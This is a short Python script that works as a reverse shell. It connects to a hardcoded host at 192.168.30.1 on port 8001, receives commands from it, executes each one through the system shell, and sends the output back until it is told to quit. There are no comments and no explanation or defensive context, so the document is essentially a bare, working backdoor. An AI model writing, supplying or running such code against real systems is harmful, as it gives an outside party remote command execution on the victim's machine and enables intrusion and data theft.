#!/usr/bin/python

import subprocess, socket

HOST = '192.168.30.1'
PORT = 8001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.send('Hello there')

while 1:
    data = s.recv(1024)
    if data == "quit\n": 
        break

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    stdoutput = proc.stdout.read() + proc.stderr.read()

    s.send(stdoutput)

s.send('Bye now')
s.close()
